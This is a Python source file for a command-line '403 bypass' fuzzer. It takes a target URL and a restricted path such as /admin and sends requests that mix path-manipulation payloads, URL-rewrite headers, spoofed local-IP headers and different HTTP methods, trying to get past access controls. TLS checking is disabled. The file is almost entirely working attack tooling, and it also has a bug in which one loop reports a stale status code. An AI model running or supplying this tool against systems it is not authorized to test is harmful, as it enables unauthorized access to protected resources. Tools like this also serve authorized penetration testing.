import requests
import warnings
import argparse
from modules.payloads.url_payloads import non_in_between_payloads, in_between_payloads
from modules.payloads.http_methods import http_methods
from modules.payloads.headers import headers
from modules.payloads.local_ip_addresses import addresses
from modules.payloads.url_rewrite_headers import url_rewrite_headers
from modules.utilities.fuzzer_outputs import url_fuzzer_output, http_method_fuzzer_output, header_fuzzer_output


def show_banner(display): 

	if display: 
		return print("""\u001b[36m
													
	___ ___ ___    _____                             
	| | |   |_  |  | __  |_ _ ___ ___ ___ ___ ___ ___ 
	|_  | | |_  |  | __ -| | | . | .'|_ -|_ -| -_|  _|
	|_|___|___|  |_____|_  |  _|__,|___|___|___|_|  
						|___|_|        \u001b[0m                  
							
				\033[1;33;36m originally written by @channyeinwai.
					modded by k3rubin \m/ \033[1;33;0m
		""")

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

parser = argparse.ArgumentParser(description="403 Bypasser : python 403-bypass.py -u https://www.example.com -p /admin -x .pdf")
parser.add_argument('-u', '--url' , help = 'Provide url ' , required=True)
parser.add_argument('-p' , '--path' , help = 'Provide the path (ex. /admin)' , required=True)
parser.add_argument('-q' , '--query' , help = 'Provide query string (ex. id=1) [optional]' , required=False)
parser.add_argument('-x' , '--extension' , help = 'Provide extra payload/extension [optional]' , required=False)
parser.add_argument("--banner", action="store_true", help="Display the banner.")
args = parser.parse_args()

url = args.url.rstrip('/')
path = args.path.lstrip('/')
extension = args.extension
query_string = args.query

show_banner(args.banner)

full_url = url+'/'+path
slash_path = '/'+path

full_payload_list = non_in_between_payloads + in_between_payloads

print("Target URL: ", url)

print("\n", "Fuzzing via URL....", "\n")

for payload in in_between_payloads:
		full_url2 = url+slash_path+payload
		req = requests.get(full_url2, allow_redirects=False , verify = False , timeout = 5, params = query_string)
		url_fuzzer_output(full_url2, str(req.status_code))
	
for payload in non_in_between_payloads:
		full_url3 = url+payload+path
		r = requests.get(full_url3 , allow_redirects=False , verify = False , timeout = 5, params = query_string)
		url_fuzzer_output(full_url3, str(req.status_code))

if (extension != None):
	for payload in full_payload_list:
			full_url4 = url + slash_path + payload + extension
			req = requests.get(full_url4, allow_redirects=False , verify = False , timeout = 5, params = query_string)
			url_fuzzer_output(full_url4, str(req.status_code))
			
print("\n", "Fuzzing via HTTP Headers....", "\n")

for rewrite_header in url_rewrite_headers:
	req = requests.get(full_url, headers={rewrite_header:slash_path}, allow_redirects=False , verify=False , timeout=5)
	header_fuzzer_output(full_url, str(req.status_code), rewrite_header, slash_path)

for header in headers:
	for address in addresses:
		req = requests.get(full_url, headers={header:address}, allow_redirects=False , verify=False , timeout=5, params = query_string)	
		header_fuzzer_output(full_url, str(req.status_code), header, address)

print("\n", "Fuzzing via HTTP Methods....", "\n")

for method in http_methods:
	request = requests.request("{}".format(method), full_url, allow_redirects=False, verify=False, timeout= 5, params = query_string)
	http_method_fuzzer_output(full_url, str(request.status_code), method)

# TODO - Add color on results
